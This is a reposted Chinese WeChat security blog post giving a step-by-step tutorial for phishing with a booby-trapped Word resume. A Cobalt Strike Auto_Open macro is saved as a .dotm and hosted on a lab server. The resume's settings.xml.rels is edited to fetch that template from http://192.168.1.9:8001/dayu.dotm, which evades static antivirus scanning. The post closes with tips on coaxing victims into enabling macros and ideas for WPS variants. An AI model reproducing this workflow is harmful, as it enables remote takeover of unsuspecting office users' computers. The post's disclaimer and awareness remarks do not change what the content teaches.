> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9tOKs6j0B6Trhv-1YKyA6A)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

授权转载，文章来源：“大余 xiyou” 博客

**0x01 前言**

网络钓鱼是社会工程学攻击方式之一，主要是通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段！  

网络钓鱼攻击是个人和公司在保护其信息安全方面面临的最常见的安全挑战之一。无论是获取密码、信用卡还是其他敏感信息，黑客都在使用电子邮件、社交媒体、电话和任何可能的通信方式窃取有价值的数据。

网络钓鱼攻击的兴起对所有组织都构成了重大威胁。重要的是，如果他们要保护自己的信息，所有组织都应该知道如何发现一些最常见的网络钓鱼骗局。同样还要熟悉攻击者用来实施这些骗局的一些最常见的技术类型。

这篇主要演示如何创建 Word 文档进行钓鱼，并控制对方，该方法也是红队常用的钓鱼方式之一，利用的是分离免杀！最后还会写一点思路！

**0x02 环境介绍**

**黑客（攻击者）：  
**

IP：192.168.1.9

系统：kali.2020.4

**VPS 服务器：**

目前演示是用 kali 来架设做 VPS 公网服务器的！道理意义一样！

**办公电脑：**

系统：windwos10

IP：192.168.1.208

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcPjhOzyqIkzyCuCL5HIaPKlOjxyEWYPUkmz6pxkpxNwnQ1BIWKDL57g/640?wx_fmt=png)

目前 kali 上运行了 Cobalt strike ，攻击者在自己的公网 VPS 服务器上制作了后门 word 文档，并上传上去作为钓鱼用，办公电脑收到对方邮件或者各种手段发送的 word 后门文档，最终黑客控制办公电脑的过程！！

**0x03 Word 文档注入后门宏演示**

**1、创建基础文档**  

在桌面基础创建文档名称：dayu.docx

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcDVib93Ic2rwMeZ0wiavOVibft2IUmT8MsXjZhVIh135VHRuavRpemMhOg/640?wx_fmt=png)  

**2、开发工具**

大部分办公都不需要开发环境工具，所以在 word 文档栏目中是没有开发工具这项栏目的，需要在这里打开即可！！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcwPeQJTeNaibfVhR4PLCTdnWf6S2LgZCfWlpJq6OMz3fW05pXhFE2aIQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLchP4B3zJxKyDNZIh8EOIYbrFgYxLRsTuVYltp5RdNkJy5HHDMA9gD0g/640?wx_fmt=png)

**3、CS 创建 office 后门**

这里 CS 在前面已经讲得很详细了，不懂的往前看看文章！Attacks-MS office Macro 进入！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc6kO1PwY3ju7vmxU3nYX931yeR3O9KUxn1e8U3ASSRibpcNeeSa9u4Bg/640?wx_fmt=png)

选择监听！点击 Generate！  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc5khTWXp7f2p0lA69WZzjQrOySvW7NQKgsdic6lsBypLExuib14mZlNTg/640?wx_fmt=png)

生成宏后门，点击复制！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcqersuPdzkWKOhOdMnlEZ8ia6CicwAFIxXzSElVvt1JsFWThr6nZmGktg/640?wx_fmt=png)

**4、插入后门代码**

点击开发工具后，双击打开 ThisDocument 后出现编辑框！将刚复制好的 CS 后门代码复制进入！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc4nVl1fib34BPb6V6SZqTelDNuy3hoacxbKXljKBH3xwJ8b5RlwK6ibWg/640?wx_fmt=png)

右上角选择 Auto_Open，简单理解就是自动打开的意思！就是对方在打开 word 文档时，簿会自动运行宏提示信息，是否点击，点击就抓取到了 shell！！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcjHLy7M3MFziaEpAB6bO1SGD6gpRdgsp7M4T6sDFAI5vayIqFKLLR7iaQ/640?wx_fmt=png)

Ctrl+S 保存后，会提示，点击否即可！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc7wU0tT3ZRmqBwI8jGKAPT2ickvyt9fHn0AbCicJxIEibT1JBauiaoSjR7A/640?wx_fmt=png)

选择保存类型：*.dotm…（为什么选择 dotm，往下看就晓得了~）

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcwFG5AaK7OVJsicUCuTPCss2tI54oB3emhNRDYZ1z6n8icmianbWKMNRPg/640?wx_fmt=png)

保存后提示报毒了！！未做任何免杀的！！继续…

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcZGibvMFDa994gABg2l1LUIGtic8Th1VSFxgMNQicjwIW7foRsVHibcaUaw/640?wx_fmt=png)

目前桌面上有两个文件，一个宏，一个 docx…（为了讲得更细致步骤就细化了）

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc1jEicMtibPJxbpFVdv3gJvM0xPabAJYXe6qLpTTAwia5O6wHiafnu6Xnicg/640?wx_fmt=png)

**5、简单测试**

这里简单测试，是测试 CS 生成的 shell 和本机是互联的，确保能拿到对方控制权限！

右键点打开！（必须右键点打开！）

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcsj4W37y9GnZgdpAeEiaoVH2wf8GPRrRo6e0ILfyfoYRuWHwE9psuGjQ/640?wx_fmt=png)

提示宏已禁用，点击启用内容！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcnicYDD3O6H1b9kFsGl5jDrH9icDYInkyle49V3N2eRFEhN9q9yTLYa0Q/640?wx_fmt=png)

正常上线！说明没问题，那么接下来继续！！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcRI7wialbbR8Xjjn4K4N2hxAOlYMjicUZJUEZGu1UmXsTsjuxjP7cM7pQ/640?wx_fmt=png)

**6、上传后门宏**

将后门宏文件 dayu.dotm 上传到公网服务器中（这里用 kali 进行模拟）  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc8dBqicicYYe7sSRIiacZ2uYBHeVicTbEcP41qn96OLmvwpvzxqicJzw44ZA/640?wx_fmt=png)

**7、新建 word 文档**

目前文档类型非常多，我已简历为主！这里创建一个简历模版保存到桌面即可！  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcNgpibmHbVLuc3pmiaA4jnTfvCtXTm8gRn6b4VAqjibG3hfGEKPUAtTEWA/640?wx_fmt=png)

**8、修改文件名**

修改文件名：docx 改为 zip 类型！！  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc0pW3RIwcHHasxsfmibH1wuiafW7icNCObKYVjVZSe6Xib7U8JB5mGC0uMw/640?wx_fmt=png)

**9、修改宏内容**

将 zip 文件解压，进入 / word/_rels 目录下，打开 settings.xml.rels 宏文件，这段就是宏需要执行的代码…！  

```
file:///C:\Users\yujun\AppData\Roaming\Microsoft\Templates\精美简历，由%20MOO%20设计.dotx
```

‍

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcvMnmxxv7GE9zu8qIYtk0evxYk1rfsicLkHhd9NYaicqMSzqVnEmZXWoQ/640?wx_fmt=png)

将该段代码修改为以下内容，意思就是执行开启宏后，会执行访问下载服务器上的 dotm 宏文件并执行！！

```
http://192.168.1.9:8001/dayu.dotm
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcZoL5kkDmuKsKsXgX4qRncliaPRaP1p5hvJib5JVR1WGpkL4WibMdJe4Ow/640?wx_fmt=png)

然后将内容重新压缩后，在修改 zip 为 docx 类型，修改后可看到就是我的简历了！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcJLUkfxvRkibXLX2QQ0qvOby0KgqcsllFNENrZBf3yC9lTAqLPSsNADw/640?wx_fmt=png)

这里利用的是分离免杀的方法，里面的代码都是正常的，由于杀毒软件是静态查杀，所以无法查杀的！

**10、下载并执行**

可看到通过下载该简历文件，微软、360、火绒都是不查杀的！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcQz2cicCGTsVxGxmupicDVdvYSYiapJicibaSibCdansvNQGptvibSibSqJPpTg/640?wx_fmt=png)

出于好奇心，打开文档，提示：

```
该工程中的宏被禁止，请...........是否激活...
```

那么安全意识强的肯定是点 X，安全意识差的，点确定，都没关系！钓鱼嘛，主要钓鱼安全意识差，又不懂安全的人，社会太多太多了~~ 所以要加强安全意识啊！

这里点击确定或者关闭点 X 关掉该框框，都意义不大，主要的意思是提醒用户，左上角可以启用内容！！！使用宏！！！正常浏览简历！！！

那么左上角还有个安全警告，点击启用内容！！

**11、成功控制**

可看到成功获得办公电脑 192.168.1.208 的控制权限！！  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc8e91kAVNDC0KaOFjTyGhYMjWNhmfQulBdjoH693IgBPoCozCj7WwZA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcGsBVJQiaU4TCRg760MPBOWs58m8yKYABEZqmvfG45lhUODsAvMhkK8Q/640?wx_fmt=png)

**0x04 另外思路**

如果是遇到 WPS 的客户怎么办？通过上面的方法 WPS 打开我的简历是不会提示宏的！我这只提供思路，因为现在群体用 WPS 非常的多，就不会写出来了！  

**另外思路：**

```
1. 打开WPS创建宏是暗色的需要安装VBA for WPS才可以写WPS宏病毒代码执行！
2. Office和WPS中还可以隐藏文字，可以利用该方式通过配合录制宏的方法，用该方式执行…
3. Normal模块下，不止能编写一个settings.xml.rels…可以多宏…
4. 弹框执行代码写入宏，那么Excel、PPT等也写…
5. 不止docx宏，还有很多，能另存文件内容的都可以…
```

还有前面也提了混淆，就到这里，不在往下说了… 提高安全意识吧~~

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

只需关注公众号并回复 “9527” 即可获取一套 HTB 靶场学习文档和视频，“1120” 获取安全参考等安全杂志 PDF 电子版，“1208” 获取个人常用高效爆破字典，“0221” 获取 2020 年酒仙桥文章打包，还在等什么？赶紧关注学习吧！

* * *

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcAcRDPBsTMEQ0pGhzmYrBp7pvhtHnb0sJiaBzhHIILwpLtxYnPjqKmibA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)